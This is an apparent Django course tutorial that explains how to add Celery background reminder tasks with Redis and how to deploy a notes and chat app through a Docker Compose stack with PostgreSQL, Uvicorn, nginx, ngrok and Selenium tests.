Broker Pros Cons Redis fast (in-memory), simple, already in the project loses tasks on restart without persistence RabbitMQ reliable, complex routing harder to set up PostgreSQL no separate service needed slow, puts load on the DB

In notes_chat_app Redis is already there for Django Channels. We use it for Celery too, but with different DBs so the messages do not get mixed:

Redis server (one)
├── DB 0  ← Django Channels (WebSocket channel layer)
└── DB 1  ← Celery (broker + result backend)

If both used DB 0, Redis could mix up chat WebSocket messages with Celery reminder tasks. Separate DBs isolate them.

docs.title: Comparison: sync in the view vs Celery in the background
docs.text:
Sync in the view Celery in the background Response to the browser blocked until completion instant (< 10 ms) Scheduled execution ❌ impossible ✅ Celery Beat Scaling 1 task at a time (blocks the thread) N workers in parallel Fault tolerance on error exception → 500 for the user automatic retry State visibility none worker logs, result backend Complexity minimal +2 services (worker, beat), broker

When Celery is worth using:

  • the task takes > 200 ms (email, HTTP to an external API, file processing, PDF)
  • the task must run on a schedule, independently of HTTP requests
  • the task must be run several times with retry on error
  • you need to process hundreds of tasks in parallel

docs.title: Step 1: celery.py: initializing the Celery app
docs.text:
First you need to create the Celery app. It is a Python object that knows about the project's settings and tasks.

# notes_project/celery.py
import os
from celery import Celery

# Tell Django where to find settings.py
# This is needed BEFORE Celery tries to import Django
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'notes_project.settings')

# Create the Celery app named after our Django project
app = Celery('notes_project')

# Load the configuration from Django's settings.py
# namespace='CELERY' means: read only variables that start with CELERY_
# For example: CELERY_BROKER_URL, CELERY_RESULT_BACKEND, CELERY_BEAT_SCHEDULE
app.config_from_object('django.conf:settings', namespace='CELERY')

# Automatically finds tasks.py in every INSTALLED_APP
# Without this you would have to import every tasks.py by hand
app.autodiscover_tasks()

Why namespace='CELERY'?

Celery looks in settings.py only for variables that start with CELERY_:

# settings.py
CELERY_BROKER_URL = '...'         # ✅ will be found
CELERY_BEAT_SCHEDULE = {...}      # ✅ will be found
BROKER_URL = '...'                # ❌ old style, ignored

docs.title: Connecting to Django through __init__.py
docs.text:
# notes_project/__init__.py
from .celery import app as celery_app

__all__ = ('celery_app',)

Why is this needed?

When Django starts, it executes notes_project/__init__.py. This line guarantees that celery_app is loaded before any code starts using @shared_task.

Without it, this situation could occur:

Worker starts → imports notes_app.tasks → @shared_task does not know which app to bind to → error

With this line:

Worker starts → notes_project/__init__.py → celery_app already exists → @shared_task binds to it ✓

docs.title: Step 2: tasks.py: the background task
docs.text:
# notes_app/tasks.py
from celery import shared_task
from django.core.mail import send_mail
from django.conf import settings
from django.utils import timezone


@shared_task
def send_reminder_notifications():
    # Import inside the function to prevent circular imports.
    # tasks.py is imported before Django is fully initialized,
    # so importing models at module level may cause AppRegistryNotReady.
    from .models import Reminder

    now = timezone.now()

    # select_related('note__user') solves N+1:
    # Instead of 1 query for the note + 1 query for the user for every reminder
    # → 1 SQL query with a JOIN: SELECT reminder.*, note.*, auth_user.*
    pending = (
        Reminder.objects
        .select_related('note__user')
        .filter(remind_at__lte=now, is_sent=False)
    )

    for reminder in pending:
        user = reminder.note.user

        # Check that the user has an email
        # (by default a User can be created without an email through UserCreationForm)
        if user.email:
            send_mail(
                subject=f'Нагадування: {reminder.note.title}',
                message=reminder.message or f'Час нагадування для «{reminder.note.title}».',
                from_email=settings.DEFAULT_FROM_EMAIL,
                recipient_list=[user.email],
                # fail_silently=True: if SMTP is unavailable, don't raise an exception.
                # In production you should log the error, but not stop processing
                # the remaining reminders because of a single SMTP failure.
                fail_silently=True,
            )

        # Mark as sent
        reminder.is_sent = True

        # update_fields=['is_sent'] updates ONLY this field:
        # SQL: UPDATE reminder SET is_sent = TRUE WHERE id = 42
        # Instead of: UPDATE reminder SET remind_at=..., message=..., is_sent=TRUE, ... WHERE id = 42
        # More efficient and safer: if another process changed remind_at, we won't overwrite it
        reminder.save(update_fields=['is_sent'])

        # If the reminder repeats, create the next one
        _schedule_next(reminder)


def _schedule_next(reminder):
    """Creates the next reminder for repeating notes."""
    if reminder.repeat_pattern == 'none':
        return  # one-time: do nothing

    from .models import Reminder
    from dateutil.relativedelta import relativedelta

    # relativedelta instead of timedelta for months:
    # timedelta(days=30) for January 31 gives March 1 in 2024 (March 2 in a non-leap year), skipping February!
    # relativedelta(months=1) for January 31 gives February 28/29 (correct)
    delta_map = {
        'daily':   relativedelta(days=1),
        'weekly':  relativedelta(weeks=1),
        'monthly': relativedelta(months=1),
    }
    delta = delta_map.get(reminder.repeat_pattern)
    if delta:
        Reminder.objects.create(
            note=reminder.note,
            remind_at=reminder.remind_at + delta,
            message=reminder.message,
            is_sent=False,
            repeat_pattern=reminder.repeat_pattern,
        )

docs.title: Why @shared_task and not @app.task
docs.text:
# ❌ DON'T DO THIS: hard coupling to a specific app
from notes_project.celery import app

@app.task
def send_reminder_notifications():
    ...

# ✅ CORRECT: the task binds to the active app at run time
from celery import shared_task

@shared_task
def send_reminder_notifications():
    ...

The difference matters:

  • @app.task requires importing a specific Celery app → circular imports
  • @shared_task binds to whichever Celery app is active → portable between projects, no circular imports

docs.title: relativedelta vs timedelta for months
docs.text:
from datetime import datetime, timedelta
from dateutil.relativedelta import relativedelta

d = datetime(2024, 1, 31)

# timedelta counts in days and knows nothing about months
d + timedelta(days=30)        # → 2024-03-01 (February skipped entirely!)
d + timedelta(days=28)        # → 2024-02-28 (but for October this is wrong)

# relativedelta knows about months and their length
d + relativedelta(months=1)   # → 2024-02-29 (2024 is a leap year, correct!)
datetime(2024, 3, 31) + relativedelta(months=1)  # → 2024-04-30 (correct, April has 30 days)

docs.text:
# notes_project/settings.py (end of the file)

# REDIS_URL is set through env: redis://redis:6379/0
# (the URL for Channels, DB 0)
# Replace /0 with /1: Celery uses DB 1 so it doesn't conflict with Channels
_CELERY_REDIS = _REDIS_URL.replace("/0", "/1") if _REDIS_URL else "redis://localhost:6379/1"

# Broker: where the Worker goes for tasks
CELERY_BROKER_URL = _CELERY_REDIS

# Result Backend: where execution results are stored
CELERY_RESULT_BACKEND = _CELERY_REDIS

# Timezone: Beat uses it to compute the schedule
CELERY_TIMEZONE = TIME_ZONE   # from Django settings: 'Europe/Kyiv'

# Serialization: JSON is safer than Pickle (no arbitrary code execution)
CELERY_TASK_SERIALIZER = "json"
CELERY_RESULT_SERIALIZER = "json"
CELERY_ACCEPT_CONTENT = ["json"]

# The schedule for Beat
CELERY_BEAT_SCHEDULE = {
    # An arbitrary name, shown in the Beat logs
    "send-reminders-every-minute": {
        # The full dotted path to the task: Beat finds it through autodiscover
        "task": "notes_app.tasks.send_reminder_notifications",
        # schedule=60.0 means every 60 seconds
        # You can also use: crontab(minute='*/5') for every 5 minutes
        "schedule": 60.0,
    },
}

docs.title: Configuring the email backend for dev
docs.text:
In development there is no real SMTP server. Use the console backend: it prints email right in the terminal:

# settings.py
if DEBUG:
    # Prints email to the terminal instead of actually sending it
    EMAIL_BACKEND = 'django.core.mail.backends.console.EmailBackend'
else:
    # Production: real SMTP (Gmail, SendGrid, etc.)
    EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'
    EMAIL_HOST = os.environ.get('EMAIL_HOST', '')
    EMAIL_PORT = int(os.environ.get('EMAIL_PORT', 587))
    EMAIL_USE_TLS = True
    EMAIL_HOST_USER = os.environ.get('EMAIL_HOST_USER', '')
    EMAIL_HOST_PASSWORD = os.environ.get('EMAIL_HOST_PASSWORD', '')

DEFAULT_FROM_EMAIL = 'noreply@notes.example.com'

MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Subject: =?utf-8?b?0J3QsNCz0LDQtNGD0LLQsNC90L3Rjzog...?=
From: noreply@notes.example.com
To: alice@example.com
Date: Mon, 16 Jun 2026 10:00:00 -0000

docs.title: schedule=60.0 vs crontab
docs.text:
Two ways to define a schedule:

# Option 1: every N seconds (float or int)
"schedule": 60.0        # every 60 seconds
"schedule": 3600        # every hour

# Option 2: crontab, like Linux cron
from celery.schedules import crontab

"schedule": crontab(minute='*/1')          # every minute
"schedule": crontab(hour=9, minute=0)      # every day at 09:00
"schedule": crontab(day_of_week='monday')  # every Monday

For reminders 60.0 is simpler and sufficient. Every minute we check whether there are overdue reminders.

docs.title: Step 4: Docker Compose: two new services
docs.text:
# docker-compose.yml (add to the services: section)
  celery-worker:
    build: .
    # -A notes_project  → read celery.py from notes_project/
    # worker            → worker mode (not beat!)
    # -l info           → logging level
    # --concurrency=2   → 2 parallel task execution processes
    command: celery -A notes_project worker -l info --concurrency=2
    volumes:
      - .:/app
    environment:
      DATABASE_URL: postgres://notes_user:notes_pass@db:5432/notes_db
      REDIS_URL: redis://redis:6379/0
      DJANGO_SETTINGS_MODULE: notes_project.settings
    depends_on:
      db:
        condition: service_healthy   # waits until PostgreSQL is ready
      redis:
        condition: service_healthy   # waits until Redis is ready
    networks:
      - app-net

  celery-beat:
    build: .
    # beat is the scheduler mode
    # Beat only puts tasks in the queue, it does NOT run them
    command: celery -A notes_project beat -l info
    volumes:
      - .:/app
    environment:
      DATABASE_URL: postgres://notes_user:notes_pass@db:5432/notes_db
      REDIS_URL: redis://redis:6379/0
      DJANGO_SETTINGS_MODULE: notes_project.settings
    depends_on:
      db:
        condition: service_healthy
      redis:
        condition: service_healthy
    networks:
      - app-net

docs.title: Why Worker and Beat are separate services
docs.text:
╔══════════════════╗       ╔══════════════════╗
║   celery-beat    ║       ║  celery-worker   ║
║                  ║       ║                  ║
║  Every minute:   ║──────►║  Runs the task   ║
║  "a new task"    ║       ║  send_reminder.. ║
║                  ║       ║                  ║
║  Instances: 1    ║       ║  Instances: 1+   ║
╚══════════════════╝       ╚══════════════════╝
         │                          │
         └──────── Redis ───────────┘
                  (broker)

Why Beat = 1 instance?

If you run two Beats:

Beat 1 at 10:00:00: "queueing the send_reminder_notifications task"
Beat 2 at 10:00:00: "queueing the send_reminder_notifications task"
→ The Worker runs the task TWICE → one user receives two emails!

The Worker can be scaled horizontally (--concurrency=4, or several celery-worker services). Beat is always one.

docs.title: How to queue a task manually (without Beat)
docs.text:
In production Beat queues tasks automatically. But for testing you can queue a task manually:

# Django shell or other code
from notes_app.tasks import send_reminder_notifications

# Option 1: delay() is syntactic sugar for apply_async()
send_reminder_notifications.delay()

# Option 2: apply_async() has more options
send_reminder_notifications.apply_async()
# or with a 30-second delay:
send_reminder_notifications.apply_async(countdown=30)

# Option 3: call it directly like a regular function (WITHOUT the queue, for tests)
send_reminder_notifications()

In tests we use option 3: we call the function directly, without the Worker and Redis. This lets us test the logic without Celery running.

docs.title: Unit tests for the task
docs.text:
# notes_app/tests/test_tasks.py
from django.test import TestCase, override_settings
from django.contrib.auth.models import User
from django.utils import timezone
from datetime import timedelta
from django.core import mail

from notes_app.models import Note, Reminder
from notes_app.tasks import send_reminder_notifications


class SendReminderTaskTest(TestCase):
    def setUp(self):
        self.user = User.objects.create_user(
            'alice', email='alice@test.com', password='pass123'
        )
        self.note = Note.objects.create(
            user=self.user, title='Test Note', content=''
        )

    def _reminder(self, offset_minutes=-5, repeat='none', is_sent=False):
        return Reminder.objects.create(
            note=self.note,
            remind_at=timezone.now() + timedelta(minutes=offset_minutes),
            message='Тест',
            is_sent=is_sent,
            repeat_pattern=repeat,
        )

    @override_settings(EMAIL_BACKEND='django.core.mail.backends.locmem.EmailBackend')
    def test_marks_due_reminder_as_sent(self):
        r = self._reminder(offset_minutes=-5)
        send_reminder_notifications()
        r.refresh_from_db()
        self.assertTrue(r.is_sent)

    @override_settings(EMAIL_BACKEND='django.core.mail.backends.locmem.EmailBackend')
    def test_ignores_future_reminders(self):
        r = self._reminder(offset_minutes=+10)
        send_reminder_notifications()
        r.refresh_from_db()
        self.assertFalse(r.is_sent)

    @override_settings(EMAIL_BACKEND='django.core.mail.backends.locmem.EmailBackend')
    def test_sends_email_to_user(self):
        self._reminder(offset_minutes=-5)
        send_reminder_notifications()
        self.assertEqual(len(mail.outbox), 1)
        self.assertIn('alice@test.com', mail.outbox[0].to)

    @override_settings(EMAIL_BACKEND='django.core.mail.backends.locmem.EmailBackend')
    def test_daily_repeat_creates_next_reminder(self):
        r = self._reminder(offset_minutes=-5, repeat='daily')
        original_at = r.remind_at
        send_reminder_notifications()
        next_r = Reminder.objects.filter(note=self.note, is_sent=False).first()
        self.assertIsNotNone(next_r)
        diff = (next_r.remind_at - original_at).total_seconds()
        self.assertAlmostEqual(diff, 86400, delta=60)

@override_settings(EMAIL_BACKEND='...locmem...') captures email in mail.outbox without a real SMTP server. The standard Django pattern for testing email.

mail.outbox is a list of EmailMessage objects. Each has .to, .subject, .body. It is reset automatically after every test.

class RemindersCheckViewTest(TestCase):
    def setUp(self):
        self.alice = User.objects.create_user('alice', password='pass123')
        self.bob = User.objects.create_user('bob', password='pass123')
        self.note = Note.objects.create(user=self.alice, title='Alice Note', content='')

    def test_requires_login(self):
        resp = self.client.get('/reminders/check/')
        self.assertEqual(resp.status_code, 302)

    def test_returns_due_reminders(self):
        self.client.force_login(self.alice)
        r = Reminder.objects.create(
            note=self.note,
            remind_at=timezone.now() - timedelta(minutes=30),
        )
        resp = self.client.get('/reminders/check/')
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertEqual(len(data['reminders']), 1)
        self.assertEqual(data['reminders'][0]['id'], r.id)

    def test_excludes_other_users_reminders(self):
        self.client.force_login(self.bob)
        Reminder.objects.create(
            note=self.note,
            remind_at=timezone.now() - timedelta(minutes=30),
        )
        resp = self.client.get('/reminders/check/')
        self.assertEqual(len(resp.json()['reminders']), 0)

docs.text:
# notes_app/tests/test_selenium.py (an additional class)
class SeleniumReminderToastTest(_DockerLiveServerMixin, StaticLiveServerTestCase):

    def setUp(self):
        self.user = User.objects.create_user(
            'rem_user', email='rem@test.com', password='pass123'
        )
        self.note = Note.objects.create(
            user=self.user, title='Selenium Reminder Note', content=''
        )

    def test_toast_appears_for_due_reminder(self):
        Reminder.objects.create(
            note=self.note,
            remind_at=timezone.now() - timedelta(minutes=30),
            message='JS toast test',
        )
        self._login_via_cookie()
        self.driver.get(f'{self.live_server_url}/notes/')

        # checkReminders() runs right on DOMContentLoaded: wait at most 10 sec
        toast = WebDriverWait(self.driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, '.toast.show'))
        )
        self.assertIn('Selenium Reminder Note', toast.text)

Why doesn't the Selenium test wait 60 seconds?

reminders.js calls checkReminders() right on DOMContentLoaded, before the first interval cycle. The test waits only for the HTTP fetch (< 2 seconds).

docs.text:
docker compose run --rm web python manage.py test notes_app.tests.test_tasks -v 2

The unit tests for the task need neither Selenium nor a running celery-worker: send_reminder_notifications() is called directly like a regular Python function.

docs.title: Selenium tests (the stack must be running)
docs.text:
# First bring up the stack:
docker compose up -d

# Then run the test through exec (not run!):
docker compose exec web python manage.py test \
  notes_app.tests.test_selenium.SeleniumReminderToastTest -v 2

exec, not run

Selenium tests are run through docker compose exec, not docker compose run --rm. run creates a separate container without the web network alias, which the Selenium container uses to reach the application.

docs.title: Why test the task as a regular function
docs.text:
Why: when you call send_reminder_notifications() (without .delay()), no Celery Worker is needed: the task runs synchronously in the current process. This lets you test the business logic in isolation from the infrastructure.

# In a test: call it directly, without the Worker and Redis
send_reminder_notifications()       # ← runs immediately, synchronously

# In production: Beat queues it through Redis
send_reminder_notifications.delay() # ← the Worker will run it asynchronously

This is the standard Celery testing pattern: we test the function's logic, not the queue infrastructure.

docs.title: Step 9. Deployment
docs.text:
This step walks you through a complete production-ready stack: PostgreSQL → Django → Redis → Channels → nginx → ngrok.

The project — notes_chat_app — brings together all the previous steps: templates + auth + tests + async + WebSocket + Docker + nginx. You will see how all the components work together in a real system.

Result: an application with PostgreSQL, a real-time group chat, Selenium E2E tests and public access through ngrok.

Prerequisites

Before you start, make sure you have completed:

  • Step 7. Async and WebSocket — ASGI, Channels, Consumer, channel layer
  • Step 6. Testing — the test pyramid, TestCase, WebsocketCommunicator

docs.title: The course project
docs.text:
This step uses notes_chat_app — the same Django application as in the previous steps, but now packaged into a production-ready Docker Compose stack.

Dev (previous steps) Production (this step) DB SQLite (file) PostgreSQL (container) Server runserver (WSGI) Uvicorn (ASGI) Proxy — nginx (static files, WebSocket) Channel layer InMemory Redis (scalable) Public access — ngrok (HTTPS tunnel) Startup python manage.py runserver docker compose up

docs.title: Services table
docs.text: Service Image Port Role db postgres:16-alpine 5432 Relational DB redis redis:7-alpine 6379 Channel layer (WebSocket pub/sub) web Dockerfile 8001 Django + Uvicorn ASGI nginx nginx:1.27-alpine 80 Reverse proxy, static files ngrok ngrok/ngrok 4040 Public HTTPS tunnel selenium selenium/standalone-chrome 4444 Headless Chrome for E2E

docs.title: Why the production stack is more complex
docs.text:
SQLite is not suitable for production in Docker: without a named volume, the db.sqlite3 file is destroyed together with the container after docker compose down. PostgreSQL stores its data in a named volume, independently of the containers.

InMemoryChannelLayer is not suitable for multiple workers: it keeps messages in the RAM of a single process. If you run several uvicorn workers, they cannot see each other. The Redis channel layer solves this with shared pub/sub.

runserver is not suitable for async: Django's built-in development server is WSGI. WebSocket requires ASGI. Uvicorn handles both HTTP and WebSocket through a single event loop.

nginx is required for: serving static files without loading Python, WebSocket Upgrade headers, and correct proxying to Uvicorn.

docs.title: Docker Compose
docs.text: Key concept: health checks and depends_on: condition: service_healthy guarantee that each service waits for the previous one to be ready before starting.

docs.title: Full dependency diagram
docs.text:
db (postgres)          → healthy?
    │
redis (redis)          → healthy?
    │
    └──────────────────────────┐
                               ▼
                         web (django + uvicorn)
                               │
                               → migrate
                               → collectstatic
                               → seed_demo_data (if SEED_DEMO_DATA=1)
                               → uvicorn start
                               │
                         web healthy?
                               │
                        nginx (reverse proxy)
                               │
                         nginx healthy?
                               │
                        ngrok (public tunnel)
                               │
                        selenium (e2e tests chrome)

docs.title: docker-compose.yml — a detailed walkthrough
docs.text:
services:

  # ─── PostgreSQL ──────────────────────────────────────────────────────
  db:
    image: postgres:16-alpine     # minimal image (alpine = ~80 MB)
    volumes:
      - postgres_data:/var/lib/postgresql/data  # data persists across restarts
    environment:
      POSTGRES_DB:       ${POSTGRES_DB}
      POSTGRES_USER:     ${POSTGRES_USER}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U ${POSTGRES_USER} -d ${POSTGRES_DB}"]
      # pg_isready: a PostgreSQL utility — checks whether the server accepts connections
      interval: 5s      # check every 5 seconds
      retries: 5         # consider "healthy" after 5 successful checks
    networks: [app-net]

  # ─── Redis ───────────────────────────────────────────────────────────
  redis:
    image: redis:7-alpine
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]   # PONG = redis is alive
      interval: 5s
    networks: [app-net]

  # ─── Web (Django) ────────────────────────────────────────────────────
  web:
    build: .             # Dockerfile in the current directory
    ports:
      - "8001:8001"      # direct access for Selenium (tests do not go through nginx)
    environment:
      DATABASE_URL:  postgres://${POSTGRES_USER}:${POSTGRES_PASSWORD}@db:5432/${POSTGRES_DB}
      REDIS_URL:     redis://redis:6379/0
      SECRET_KEY:    ${SECRET_KEY}
      DEBUG:         ${DEBUG:-False}
      ALLOWED_HOSTS: ${ALLOWED_HOSTS:-localhost,127.0.0.1}
      NGROK_DOMAIN:  ${NGROK_DOMAIN}
      SEED_DEMO_DATA: ${SEED_DEMO_DATA:-0}
      WEB_HOST:      web              # for the Selenium Docker network
      SELENIUM_REMOTE_URL: http://selenium:4444/wd/hub
    volumes:
      - staticfiles:/app/staticfiles   # web writes → nginx reads
    depends_on:
      db:    {condition: service_healthy}
      redis: {condition: service_healthy}
    healthcheck:
      test: >
        python -c "import urllib.request;
        urllib.request.urlopen('http://localhost:8001/accounts/login/')"
      interval: 5s
      retries: 12
      start_period: 15s   # first health check 15 seconds after startup
    networks: [app-net]

  # ─── Nginx ───────────────────────────────────────────────────────────
  nginx:
    image: nginx:1.27-alpine
    ports: ["80:80"]
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro   # config (read-only)
      - staticfiles:/staticfiles:ro                   # static files (read-only)
    depends_on:
      web: {condition: service_healthy}
    healthcheck:
      test: ["CMD-SHELL", "curl -sf http://localhost/accounts/login/ || exit 1"]
      interval: 10s
    networks: [app-net]

  # ─── Ngrok ───────────────────────────────────────────────────────────
  ngrok:
    image: ngrok/ngrok:latest
    command: http --url=${NGROK_DOMAIN} nginx:80
    # ↑ tunnel from the public URL to nginx inside the Docker network
    environment:
      NGROK_AUTHTOKEN: ${NGROK_AUTHTOKEN}
    ports: ["4040:4040"]   # ngrok dashboard (traffic inspector)
    depends_on:
      nginx: {condition: service_healthy}
    networks: [app-net]

  # ─── Selenium ────────────────────────────────────────────────────────
  selenium:
    image: selenium/standalone-chrome:latest
    ports:
      - "4444:4444"    # WebDriver API (used by test_selenium.py)
      - "7900:7900"    # VNC (you can watch the browser live: http://localhost:7900)
    shm_size: '2g'     # Chrome needs shared memory
    networks: [app-net]

# ─── Named volumes ───────────────────────────────────────────────────────
volumes:
  postgres_data:    # PostgreSQL data (persists across docker compose down/up)
  staticfiles:      # Django collectstatic output (web → nginx)

# ─── Named network ───────────────────────────────────────────────────────
networks:
  app-net:
    driver: bridge
    # An explicit network guarantees DNS resolution between containers:
    # "nginx" → IP of the nginx container, "redis" → IP of the redis container, etc.
    # Without an explicit network ngrok may not find "nginx" → ERR_NGROK_8012

docs.title: Why start_period matters in a healthcheck
docs.text:
start_period: 15s  for web:

  0s   → the container has started
  0–15s → entrypoint.sh: migrate + collectstatic + seed_demo_data
         The healthcheck is not counted! (not considered a failure)
  15s  → real checks start every 5s
  75s  → if all 12 attempts failed → the service is "unhealthy"
         nginx does not start (depends_on: service_healthy)

Without start_period: the healthcheck counts 12 attempts from the very first second.
If migrate takes 10s → nginx tries to start → 503 → ngrok cannot reach it.

docs.title: The problem without health checks
docs.text:
WITHOUT health checks:
  docker compose up
  → db starts (but PostgreSQL is still initializing for ~3 sec)
  → web starts (depends_on: db — but only "started", not "healthy")
  → entrypoint.sh: migrate → ERROR: could not connect to server
  → uvicorn does not start
  → nginx does not start (but keeps trying)
  → ngrok cannot reach it → ERR_NGROK_8012

WITH health checks (condition: service_healthy):
  → db starts → pg_isready → HEALTHY (only then is web allowed to start)
  → web starts → migrate → uvicorn → healthcheck pass → HEALTHY
  → nginx starts → HEALTHY
  → ngrok starts (nginx is already ready)

docs.title: Types of healthcheck tests
docs.text:
# PostgreSQL — pg_isready (the official utility):
test: ["CMD-SHELL", "pg_isready -U myuser -d mydb"]

# Redis — redis-cli ping:
test: ["CMD", "redis-cli", "ping"]

# Web — HTTP request:
test: >
  python -c "import urllib.request;
  urllib.request.urlopen('http://localhost:8001/accounts/login/')"

# Nginx — curl HTTP:
test: ["CMD-SHELL", "curl -sf http://localhost/accounts/login/ || exit 1"]
# -s: silent (no progress bar), -f: fail on HTTP errors (4xx/5xx)

docs.title: Named volumes
docs.text:
volumes:
  postgres_data:    # PostgreSQL data
  staticfiles:      # Django collectstatic output

docker compose down        # stops the containers, volumes are kept
docker compose up          # postgres_data → data is preserved

docker compose down -v     # -v: removes volumes → DB and staticfiles are wiped

postgres_data is mounted into the db container at /var/lib/postgresql/data — the standard location of PostgreSQL data. On docker compose down without -v, this data stays on disk and is picked up again on the next up.

staticfiles is a volume shared between web (which writes to it during collectstatic) and nginx (which reads it with :ro). This is exactly the mechanism that lets nginx serve CSS, JS and images without involving Django.

docs.title: Named network
docs.text:
networks:
  app-net:
    driver: bridge

The explicit Docker network app-net provides DNS resolution by service name: "db" → IP of the PostgreSQL container, "redis" → IP of the Redis container, "nginx" → IP of the nginx container, and so on.

Without an explicit named network, ngrok cannot find nginx by its DNS name → ERR_NGROK_8012.

docs.title: Dockerfile — the Django image
docs.text:
# Dockerfile
FROM python:3.12-slim

WORKDIR /app

ENV PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    DJANGO_SETTINGS_MODULE=notes_project.settings \
    PYTHONPATH=/app

# First only requirements.txt — the layer is cached if the file has not changed
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Then all the code — this layer is rebuilt on every code change
COPY . .
RUN chmod +x entrypoint.sh

CMD ["./entrypoint.sh"]

docs.title: ENV variables explained
docs.text: ENV Why PYTHONDONTWRITEBYTECODE=1 Does not create .pyc files (reduces image size) PYTHONUNBUFFERED=1 Logs are printed immediately without buffering (visible in docker logs) DJANGO_SETTINGS_MODULE Tells Django which settings.py to use PYTHONPATH=/app Python looks for modules in /app

docs.title: Why requirements.txt is copied BEFORE the code
docs.text:
Layer 1: FROM python:3.12-slim         ← cached (rarely changes)
Layer 2: COPY requirements.txt .       ← cached if requirements.txt has not changed
Layer 3: RUN pip install ...           ← cached together with layer 2
Layer 4: COPY . .                      ← ALWAYS rebuilt (code changes often)
Layer 5: CMD [...]                     ← lightweight

If you copy all the code BEFORE pip install:
  → every code change → pip install again → long rebuild (~2-3 min)

With the split shown above:
  → on a code change → only COPY . . → fast (~10 sec)

docs.title: Entrypoint
docs.text: entrypoint.sh — a shell script that runs on every docker compose up. It runs the preparation steps and then starts uvicorn.

docs.title: entrypoint.sh — full code
docs.text:
#!/bin/sh
set -eu  # -e: stop on any error (exit code ≠ 0)
         # -u: fail when an undefined variable is used
# Without set -e: uvicorn starts even if migrate failed → 500 on every request

log() {
    printf '[entrypoint] %s\n' "$1"
}

if [ "${RUN_MIGRATIONS:-1}" = "1" ]; then
    log "Applying database migrations..."
    python manage.py migrate --noinput
    # --noinput: do not ask for confirmation in interactive mode
    # Applies all new migrations since the previous version of the code
fi

if [ "${RUN_COLLECTSTATIC:-1}" = "1" ]; then
    log "Collecting static files..."
    python manage.py collectstatic --noinput
    # Collects static files from all installed apps into STATIC_ROOT (/app/staticfiles)
    # Needed on every deploy (in case CSS/JS changed)
fi

if [ "${CREATE_SUPERUSER:-0}" = "1" ]; then
    log "Creating/updating Django superuser ${DJANGO_SUPERUSER_USERNAME:-admin}..."
    python manage.py shell -c "..."
    # ... creates or updates a superuser from
    # DJANGO_SUPERUSER_USERNAME / _EMAIL / _PASSWORD
fi

if [ "${SEED_DEMO_DATA:-0}" = "1" ]; then
    seed_args="--force"
    # --force: allow seeding even when DEBUG=False
    if [ "${SEED_DEMO_RESET:-0}" = "1" ]; then
        seed_args="--force --reset"
        # --reset: delete existing demo data first
    fi
    log "Seeding demo data with args: ${seed_args}"
    python manage.py seed_demo_data ${seed_args}
fi

port="${PORT:-8001}"
set -- --host 0.0.0.0 --port "${port}" --proxy-headers --forwarded-allow-ips '*'
# set -- ...: builds the argument list for uvicorn ("$@")
# --proxy-headers: trust X-Forwarded-* from nginx

if [ "${UVICORN_RELOAD:-1}" = "1" ]; then
    set -- "$@" --reload
    # --reload: auto-restart when files change (DEV ONLY!)
    # In production: UVICORN_RELOAD=0
fi

log "Starting ASGI web server on port ${port}..."
exec python -m uvicorn notes_project.asgi:application "$@"

# exec: replaces the shell process with uvicorn
# Without exec: shell → uvicorn as a child process
# SIGTERM from Docker → shell → the shell may ignore it → uvicorn never gets the signal
# With exec: SIGTERM → uvicorn → graceful shutdown ✓

Each step is controlled by an environment variable from docker-compose.yml / .env (RUN_MIGRATIONS, RUN_COLLECTSTATIC, CREATE_SUPERUSER, SEED_DEMO_DATA, SEED_DEMO_RESET, UVICORN_RELOAD, PORT), so the same script works for both dev and production.

docs.title: set -e — why migrate must finish before uvicorn
docs.text:
The set -e chain in action:

✅ Normal startup:
  migrate OK → collectstatic OK → seed OK → uvicorn START

❌ If migrate failed (for example, PostgreSQL is not ready yet):
  migrate FAIL (exit 1) → set -e → shell EXIT
  entrypoint returns exit 1
  → Docker: the container exited with an error → "Exited (1)"
  → nginx does NOT start (depends_on: service_healthy)
  → A clear error in the logs instead of mysterious 500s

Without set -e:

migrate FAIL → the shell keeps going
collectstatic → may fail too (if the DB is needed for static discovery)
seed_demo_data → may fail
uvicorn START → starts without migrations
→ 500 IntegrityError or OperationalError on every page
→ hard to figure out what went wrong

docs.title: The --noinput flag
docs.text:
python manage.py migrate --noinput
python manage.py collectstatic --noinput

--noinput (or --no-input) disables interactive confirmations. Without it:

You have requested to collect static files at the destination location as
specified in your settings:

    /app/staticfiles

This will overwrite existing files!
Are you sure you want to do this?

Type 'yes' to continue, or 'no' to cancel:

A Docker container has no interactive terminal → the command hangs forever. --noinput answers yes automatically.

docs.title: collectstatic — when and why
docs.text:
python manage.py collectstatic --noinput

This command collects static files from all installed apps into a single directory (STATIC_ROOT = /app/staticfiles):

Sources:
  notes_app/static/notes_app/css/style.css
  notes_app/static/notes_app/js/group_chat.js
  django/contrib/admin/static/admin/css/base.css
  crispy_forms/static/...

Result: /app/staticfiles/
  notes_app/css/style.css
  notes_app/js/group_chat.js
  admin/css/base.css
  ...

collectstatic runs on every docker compose up because: 1. When CSS/JS changes in the code → the new files must get into the volume 2. On the first run the staticfiles volume is empty 3. It is an idempotent operation (always safe to run)

docs.title: exec — why not just uvicorn
docs.text:
Without exec:

# ❌ Without exec (bad):
python -m uvicorn notes_project.asgi:application ...
# Process tree:
#   PID 1: sh entrypoint.sh
#   PID 2: python uvicorn  ← SIGTERM does not reach it
#
# docker stop → SIGTERM → PID 1 (sh) → sh ignores it
#             → 10 sec → SIGKILL → hard kill
# Active WebSocket connections are cut off without a graceful shutdown

With exec:

# ✅ With exec (correct):
exec python -m uvicorn notes_project.asgi:application ...
# Process tree:
#   PID 1: python uvicorn  ← SIGTERM arrives directly
#
# docker stop → SIGTERM → PID 1 (uvicorn) → graceful shutdown
#             → helps close active WebSocket connections
#             → stops cleanly

exec replaces the current shell process with the uvicorn process. After exec, PID 1 is uvicorn, not the shell. Docker always sends SIGTERM to PID 1 on docker stop, and now uvicorn receives it properly.

docs.title: Production vs dev entrypoint
docs.text:
Development (current):

